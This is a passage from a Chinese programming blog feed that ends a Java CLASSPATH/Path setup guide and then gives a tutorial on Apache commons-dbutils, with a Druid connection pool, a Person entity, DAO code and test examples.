title="2.配置CLASSPATH"></a>2.配置CLASSPATH</h2><p>创建方法同配置JAVA_HOME一样。再次创建环境变量，变量名为<code>CLASSPATH</code>，变量值为如下：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">.;%JAVA_HOME%\lib\dt.jar;%JAVA_HOME%\lib\tools.jar<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/b2d96a48d9dc45c39e93303fcd93f814.png"></p><p>classpath 环境变量使得代码可以使用sun公司提供的丰富类包。</p><h2 id="3-配置Path"><a href="#3-配置Path" class="headerlink" title="3.配置Path"></a>3.配置Path</h2><p>先在系统变量中找到<code>Path</code>，再进行编辑，在Path中添加：</p><figure class="highlight bash"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs bash">%JAVA_HOME%\bin<br>%JAVA_HOME%\jre\bin<br></code></pre></div></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/387bdada2f284d6faa17edf54f714e69.png"></p><h2 id="4-验证"><a href="#4-验证" class="headerlink" title="4.验证"></a>4.验证</h2><p>打开CMD命令行，输入 java 或者 java -version。</p>]]></content>
    
    
    <categories>
      
      <category>星星之火</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Tomcat</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JavaWEB-（十二）Apache的DbUtils框架</title>
    <link href="/2021/08/15/JavaWEB/JavaWEB-%EF%BC%88%E5%8D%81%E4%BA%8C%EF%BC%89Apache%E7%9A%84DbUtils%E6%A1%86%E6%9E%B6/"/>
    <url>/2021/08/15/JavaWEB/JavaWEB-%EF%BC%88%E5%8D%81%E4%BA%8C%EF%BC%89Apache%E7%9A%84DbUtils%E6%A1%86%E6%9E%B6/</url>
    
    <content type="html"><![CDATA[<p>commons-dbutils 是 Apache 组织提供的一个开源 JDBC工具类库，它是对JDBC的简单封装，学习成本极低，并且使用dbutils能极大简化jdbc编码的工作量，同时也不会影响程序的性能。DbUtils是java编程中数据库操作实用小工具，小巧、简单、实用。对于数据表的查询操作，可以把结果转换为 List 、Array 、Set 等集合便于操作。而对于数据表的DML操作，也只需要写SQL语句即可。</p><h1 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h1><h2 id="1-commons-dbutils简介"><a href="#1-commons-dbutils简介" class="headerlink" title="1.commons-dbutils简介"></a>1.commons-dbutils简介</h2><h3 id="1-1-QueryRunner类使用"><a href="#1-1-QueryRunner类使用" class="headerlink" title="1.1 QueryRunner类使用"></a>1.1 QueryRunner类使用</h3><p>该类简单化了SQL查询，它与ResultSetHandler组合在一起使用可以完成大部分的数据库操作，能够大大减少编码量。</p><blockquote><p>主要方法</p></blockquote><ul><li><p><code>public Object query(Connection conn, String sql, Object[] params, ResultSetHandler rsh) throws SQLException</code>：执行一个查询操作，在这个查询中，对象数组中的每个元素值被用来作为查询语句的置换参数。该方法会自行处理 PreparedStatement 和 ResultSet 的创建和关闭。</p></li><li><p><code>public Object query(String sql, Object[] params, ResultSetHandler rsh) throws SQLException</code>:　几乎与第一种方法一样；唯一的不同在于它不将数据库连接提供给方法，并且它是从提供给构造方法的数据源(DataSource) 或使用的setDataSource 方法中重新获得 Connection。</p></li><li><p><code>public Object query(Connection conn, String sql, ResultSetHandler rsh) throws SQLException</code> : 执行一个不需要置换参数的查询操作。</p></li><li><p><code>public int update(Connection conn, String sql, Object[] params) throws SQLException</code>：用来执行一个更新（插入、更新或删除）操作。</p></li><li><p><code>public int update(Connection conn, String sql) throws SQLException</code>：用来执行一个不需要置换参数的更新操作。</p></li></ul><h3 id="1-2-ResultSetHandler接口使用"><a href="#1-2-ResultSetHandler接口使用" class="headerlink" title="1.2 ResultSetHandler接口使用"></a>1.2 ResultSetHandler接口使用</h3><p>该接口用于处理java.sql.ResultSet，将数据按要求转换为另一种形式。<br>ResultSetHandler接口提供了一个单独的方法：Object handle (java.sql.ResultSet .rs)</p><blockquote><p>实现类</p></blockquote><ul><li>ArrayHandler：把结果集中的<code>第一行</code>数据转成对象数组。</li><li>ArrayListHandler：把结果集中的<code>每一行</code>数据都转成一个数组，再存放到List中。</li><li>BeanHandler：将结果集中的<code>第一行</code>数据封装到一个对应的JavaBean实例中。</li><li>BeanListHandler：将结果集中的<code>每一行</code>数据都封装到一个对应的JavaBean实例中，存放到List里。</li><li>ColumnListHandler：将结果集中<code>某一列</code>的数据存放到List中。</li><li>KeyedHandler(name)：将结果集中的<code>每一行</code>数据都封装到一个Map里，再把这些map再存到一个map里，其key为指定的key。</li><li>MapHandler：将结果集中的<code>第一行</code>数据封装到一个Map里，key是列名，value就是对应的值。</li><li>MapListHandler：将结果集中的<code>每一行</code>数据都封装到一个Map里，然后再存放到List</li></ul><h2 id="2-准备工作"><a href="#2-准备工作" class="headerlink" title="2.准备工作"></a>2.准备工作</h2><h3 id="2-1-导包"><a href="#2-1-导包" class="headerlink" title="2.1 导包"></a>2.1 导包</h3><ul><li>MySQL连接驱动 jar 包。</li><li>Druid-1.1.22.jar </li><li>commons-dbutils-1.7.jar</li><li>database.properties配置文件</li></ul><h3 id="2-2-主要使用"><a href="#2-2-主要使用" class="headerlink" title="2.2 主要使用"></a>2.2 主要使用</h3><blockquote><p>ResultSetHandler接口：转换类型接口</p></blockquote><ul><li>BeanHandler类：实现类，把一条记录转换成对象。</li><li>BeanListHandler类：实现类，把多条记录转换成List集合。</li><li>ScalarHandler类：实现类，适合获取一行一列的数据。封装的long类型的，而不是int。</li></ul><blockquote><p>QueryRunner：执行SQL语句的类</p></blockquote><ul><li>增、删、改：update()；</li><li>查询：query();</li></ul><h2 id="3-代码实现"><a href="#3-代码实现" class="headerlink" title="3.代码实现"></a>3.代码实现</h2><h3 id="3-1-基本代码"><a href="#3-1-基本代码" class="headerlink" title="3.1 基本代码"></a>3.1 基本代码</h3><blockquote><ol><li>db.properties</li></ol></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java">driver=com.mysql.cj.jdbc.Driver<br>url=jdbc:mysql:<span class="hljs-comment">//localhost:3306/WeekDay?serverTimezone=GMT%2B8</span><br>username=root<br>password=loong461<br># Druid连接池=======================================<br># 初始化连接数量<br>initialSize=<span class="hljs-number">10</span><br># 最大连接数量，当初始化的用完时，就继续新建<br>maxActive=<span class="hljs-number">30</span><br># 最小空闲连接数量，即连初始化的都长时间没有用时，也会将其释放，直至最小空闲连接数量<br>minIdle=<span class="hljs-number">5</span><br># 超时等待时间，以毫秒为单位。如果有超过最大连接数量的需求，则超过部分需要等待相应的时间，如果超了等待时间，就不会再等，即拿不到连接。<br>maxWait=<span class="hljs-number">5000</span><br></code></pre></div></td></tr></table></figure><blockquote><ol start="2"><li>DbUtils</li></ol></blockquote><p>在原代码上需要添加一个新方法，用来获取连接池：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> DataSource <span class="hljs-title">getDataSource</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> dds;<br>    &#125;<br></code></pre></div></td></tr></table></figure><p>完整代码：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.tothefor.OtherTest.Duid.Utils;<br><br><span class="hljs-keyword">import</span> com.alibaba.druid.pool.DruidDataSource;<br><span class="hljs-keyword">import</span> com.alibaba.druid.pool.DruidDataSourceFactory;<br><br><span class="hljs-keyword">import</span> javax.sql.DataSource;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.io.InputStream;<br><span class="hljs-keyword">import</span> java.sql.Connection;<br><span class="hljs-keyword">import</span> java.sql.ResultSet;<br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><span class="hljs-keyword">import</span> java.sql.Statement;<br><span class="hljs-keyword">import</span> java.util.Properties;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> DragonOne</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2021/8/14 23:33</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DbUtils</span> </span>&#123;<br>    <span class="hljs-comment">//声明连接池对象</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> DruidDataSource dds;<br>    <span class="hljs-keyword">static</span>&#123;<br>        Properties properties = <span class="hljs-keyword">new</span> Properties();<br>        InputStream is = DbUtils.class.getResourceAsStream(<span class="hljs-string">&quot;/db.properties&quot;</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            properties.load(is);<br>            <span class="hljs-comment">//创建连接池</span><br>           dds = (DruidDataSource) DruidDataSourceFactory.createDataSource(properties);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125; <span class="hljs-keyword">catch</span> (Exception e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Connection <span class="hljs-title">getConnection</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">return</span> dds.getConnection();<span class="hljs-comment">//通过连接池获取连接对象</span><br>        &#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br>    <br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> DataSource <span class="hljs-title">getDataSource</span><span class="hljs-params">()</span></span>&#123;<br>        <span class="hljs-keyword">return</span> dds;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">closeAll</span><span class="hljs-params">(Connection connection, Statement statement, ResultSet resultSet)</span></span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">if</span>(resultSet != <span class="hljs-keyword">null</span>)&#123;<br>                resultSet.close();<br>            &#125;<br>            <span class="hljs-keyword">if</span>(statement != <span class="hljs-keyword">null</span>)&#123;<br>                statement.close();<br>            &#125;<br>            <span class="hljs-keyword">if</span>(connection != <span class="hljs-keyword">null</span>)&#123;<br>                connection.close();<br>            &#125;<br>        &#125;<span class="hljs-keyword">catch</span> (SQLException e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><blockquote><ol start="3"><li>entity</li></ol></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.tothefor.OtherTest.ApacheDbUtils.entity;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> DragonOne</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2021/8/15 22:09</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Person</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> id;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">int</span> money;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Person</span><span class="hljs-params">(<span class="hljs-keyword">int</span> id, String name, <span class="hljs-keyword">int</span> money)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.id = id;<br>        <span class="hljs-keyword">this</span>.name = name;<br>        <span class="hljs-keyword">this</span>.money = money;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Person</span><span class="hljs-params">()</span> </span>&#123;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getId</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> id;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setId</span><span class="hljs-params">(<span class="hljs-keyword">int</span> id)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.id = id;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">getName</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setName</span><span class="hljs-params">(String name)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">getMoney</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> money;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title">setMoney</span><span class="hljs-params">(<span class="hljs-keyword">int</span> money)</span> </span>&#123;<br>        <span class="hljs-keyword">this</span>.money = money;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> String <span class="hljs-title">toString</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Person&#123;&quot;</span> +<br>                <span class="hljs-string">&quot;id=&quot;</span> + id +<br>                <span class="hljs-string">&quot;, name=&#x27;&quot;</span> + name + <span class="hljs-string">&#x27;\&#x27;&#x27;</span> +<br>                <span class="hljs-string">&quot;, money=&quot;</span> + money +<br>                <span class="hljs-string">&#x27;&#125;&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><blockquote><ol start="4"><li>Dao及其Impl</li></ol></blockquote><p>这里只实现了增加方法（addPerson）的代码，删除、修改的实现同理。</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.tothefor.OtherTest.ApacheDbUtils.Dao;<br><br><span class="hljs-keyword">import</span> com.tothefor.OtherTest.ApacheDbUtils.entity.Person;<br><br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> DragonOne</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2021/8/15 22:17</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">PersonDao</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">addPerson</span><span class="hljs-params">(Person person)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">delPerson</span><span class="hljs-params">(String name)</span></span>;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Person <span class="hljs-title">queryPerson</span><span class="hljs-params">(String name)</span></span>; <span class="hljs-comment">//查询单个</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;Person&gt; <span class="hljs-title">queryAll</span><span class="hljs-params">()</span></span>; <span class="hljs-comment">//查询全部</span><br>&#125;<br><br><br><span class="hljs-comment">//Dao实现类</span><br><span class="hljs-keyword">package</span> com.tothefor.OtherTest.ApacheDbUtils.Dao.Impl;<br><br><span class="hljs-keyword">import</span> com.tothefor.OtherTest.ApacheDbUtils.Dao.PersonDao;<br><span class="hljs-keyword">import</span> com.tothefor.OtherTest.ApacheDbUtils.entity.Person;<br><span class="hljs-keyword">import</span> com.tothefor.OtherTest.Duid.Utils.DbUtils;<br><span class="hljs-keyword">import</span> org.apache.commons.dbutils.QueryRunner;<br><br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><span class="hljs-keyword">import</span> java.util.List;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> DragonOne</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2021/8/15 22:28</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PersonDaoImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">PersonDao</span> </span>&#123;<br>    <span class="hljs-keyword">private</span> QueryRunner queryRunner = <span class="hljs-keyword">new</span> QueryRunner(DbUtils.getDataSource());<span class="hljs-comment">//需要使用有参数的，也可以使用不带参数的，根据需求进行选择。</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">addPerson</span><span class="hljs-params">(Person person)</span> </span>&#123;<br>        Object[] params = &#123;person.getId(),person.getName(),person.getMoney()&#125;; <span class="hljs-comment">//参数列表</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-keyword">int</span> result = queryRunner.update(<span class="hljs-string">&quot;insert into Te(id,name,money) values (?,?,?)&quot;</span>,params);<br>            <span class="hljs-keyword">return</span> result;<br>        &#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">int</span> <span class="hljs-title">delPerson</span><span class="hljs-params">(String name)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Person <span class="hljs-title">queryPerson</span><span class="hljs-params">(String name)</span> </span>&#123;<br>      <span class="hljs-comment">/* 当QueryRunner使用的是没有参数时，就在需要的时候再创建连接，如下：</span><br><span class="hljs-comment">      Person person = queryRunner.query(DbUtils.getConnection(),&quot;select * from Person where string=?&quot;,name); //这里没有添加异常，自行添加即可。</span><br><span class="hljs-comment">      */</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;Person&gt; <span class="hljs-title">queryAll</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br>&#125;<br><br><br></code></pre></div></td></tr></table></figure><blockquote><ol start="5"><li>查询实现</li></ol></blockquote><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//单个查询</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> Person <span class="hljs-title">queryPerson</span><span class="hljs-params">(String name)</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Person man = queryRunner.query(<span class="hljs-string">&quot;select * from Te where name = ?&quot;</span>,<span class="hljs-keyword">new</span> BeanHandler&lt;Person&gt;(Person.class),name);<br>            <span class="hljs-keyword">return</span> man;<br>        &#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br><br><br><span class="hljs-comment">//查询全部</span><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;Person&gt; <span class="hljs-title">queryAll</span><span class="hljs-params">()</span> </span>&#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            List&lt;Person&gt; personList = queryRunner.query(<span class="hljs-string">&quot;select * from Te &quot;</span>, <span class="hljs-keyword">new</span> BeanListHandler&lt;Person&gt;(Person.class));<br>            <span class="hljs-keyword">return</span> personList;<br>        &#125; <span class="hljs-keyword">catch</span> (SQLException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br></code></pre></div></td></tr></table></figure><blockquote><ol start="6"><li>测试代码</li></ol></blockquote><p>增加方法的测试代码：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.tothefor.OtherTest.ApacheDbUtils.Test;<br><br><span class="hljs-keyword">import</span> com.tothefor.OtherTest.ApacheDbUtils.Dao.Impl.PersonDaoImpl;<br><span class="hljs-keyword">import</span> com.tothefor.OtherTest.ApacheDbUtils.Dao.PersonDao;<br><span class="hljs-keyword">import</span> com.tothefor.OtherTest.ApacheDbUtils.entity.Person;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Author</span> DragonOne</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@Date</span> 2021/8/15 22:40</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ApacheUtilsTest</span> </span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span></span>&#123;<br>        PersonDao personDao = <span class="hljs-keyword">new</span> PersonDaoImpl();<br>        Person person = <span class="hljs-keyword">new</span> Person(<span class="hljs-number">4231</span>,<span class="hljs-string">&quot;tewt&quot;</span>,<span class="hljs-number">234</span>);<br>        <span class="hljs-keyword">int</span> t = personDao.addPerson(person);<br>        System.out.println(t); <span class="hljs-comment">//1</span><br>    &#125;<br>&#125;<br><br></code></pre></div></td></tr></table></figure><p>查询方法的测试代码：</p><figure class="highlight java"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs java"><span class="hljs-comment">//查询单个==================================</span><br>    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span></span>&#123;<br>        PersonDao personDao = <span class="hljs-keyword">new</span> PersonDaoImpl();<br>        Person person = personDao.queryPerson(<span class="hljs-string">&quot;loong&quot;</span>);<br>        System.out.println(person);<br><br>    &#125;<br><br><span class="hljs-comment">//输出</span><br>Person&#123;id=<span class="hljs-number">234</span>, name=<span class="hljs-string">&#x27;loong&#x27;</span>, money=<span 